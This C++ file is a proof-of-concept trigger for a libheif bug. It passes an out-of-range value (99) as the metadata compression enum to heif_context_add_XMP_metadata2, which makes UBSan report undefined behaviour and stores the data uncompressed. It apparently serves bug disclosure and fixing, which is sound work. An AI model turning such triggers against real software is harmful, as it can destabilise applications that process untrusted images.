/*
 * POC for Bug 11: Invalid heif_metadata_compression enum causes UB
 *
 * heif_context_add_XMP_metadata2() accepts any integer as the compression
 * parameter with no range validation. Passing value 99 triggers UBSan
 * "load of value N, which is not a valid value for type 'heif_metadata_compression'"
 * at multiple switch/branch points in context.cc.
 *
 * Build: see build.sh
 * Usage: ./poc11_trigger [path_to_any.heic]
 * Expected: UBSan runtime error referencing heif_metadata_compression enum
 */

#include <cassert>
#include <cstring>
#include <cstdio>
#include <memory>

#include "libheif/heif.h"

int main(int argc, char* argv[])
{
  fprintf(stderr, "[*] Bug 11 POC: Invalid heif_metadata_compression enum\n");

  const char* heif_path = (argc > 1) ? argv[1] : "/src/libheif/examples/example.heic";
  fprintf(stderr, "[*] Loading HEIF file: %s\n", heif_path);

  /* 1. Load an existing HEIF file to obtain a valid image handle */
  struct heif_context* ctx = heif_context_alloc();
  assert(ctx);

  struct heif_error err = heif_context_read_from_file(ctx, heif_path, nullptr);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "[-] Failed to read HEIF file: %s\n", err.message);
    fprintf(stderr, "[-] Trying with an uncompressed test file...\n");
    heif_context_free(ctx);
    ctx = heif_context_alloc();
    err = heif_context_read_from_file(ctx,
      "/src/libheif/tests/data/uncompressed_comp_YUV_422.heif", nullptr);
    if (err.code != heif_error_Ok) {
      fprintf(stderr, "[-] All fallback files failed: %s\n", err.message);
      heif_context_free(ctx);
      return 1;
    }
  }

  /* 2. Get the primary image handle */
  struct heif_image_handle* handle = nullptr;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "[-] get_primary_image_handle failed: %s\n", err.message);
    heif_context_free(ctx);
    return 1;
  }
  fprintf(stderr, "[*] Got image handle successfully\n");

  /* 3. Add XMP metadata with an out-of-range compression value.
   *
   * Valid enum range is 0..5 (heif_metadata_compression_off=0, ...,
   * heif_metadata_compression_brotli=5). Value 99 is not a valid member.
   *
   * UBSan fires in HeifContext::add_generic_metadata() at context.cc ~1762
   * when the code evaluates comparisons against the invalid enum value:
   *   if (compression == heif_metadata_compression_auto)     -- loads value 99
   *   if (compression != heif_metadata_compression_off ...)  -- loads value 99
   *   if (compression == heif_metadata_compression_zlib)     -- loads value 99
   *   else if (compression == heif_metadata_compression_deflate) -- loads value 99
   *
   * Each load triggers: "runtime error: load of value 99, which is not a valid
   * value for type 'heif_metadata_compression'"
   */
  const char xmp_data[] =
    "<?xpacket begin='\xef\xbb\xbf' id='W5M0MpCehiHzreSzNTczkc9d'?>"
    "<x:xmpmeta xmlns:x='adobe:ns:meta/'>"
    "<rdf:RDF xmlns:rdf='http://www.w3.org/1999/02/22-rdf-syntax-ns#'>"
    "<rdf:Description rdf:about=''/>"
    "</rdf:RDF></x:xmpmeta>"
    "<?xpacket end='w'?>";

  /* Cast integer 99 (out of valid enum range) to heif_metadata_compression */
  heif_metadata_compression bad_compression = (heif_metadata_compression)99;

  fprintf(stderr, "[*] Calling heif_context_add_XMP_metadata2 with compression=%d (out of valid range 0..5)\n",
          (int)bad_compression);

  err = heif_context_add_XMP_metadata2(ctx, handle,
                                       xmp_data, (int)strlen(xmp_data),
                                       bad_compression);

  /* UBSan fires during the call above.  The function returns heif_error_Ok
   * (data stored uncompressed via the else-branch fallthrough),
   * demonstrating the type confusion: no content_encoding is set but caller
   * requested compression. */
  fprintf(stderr, "[*] Return code: %d (%s)\n", err.code,
          err.code == heif_error_Ok
            ? "Ok -- data stored with no content_encoding despite invalid compression request (type confusion)"
            : err.message);

  heif_image_handle_release(handle);
  heif_context_free(ctx);
  fprintf(stderr, "[*] Done.\n");
  return 0;
}
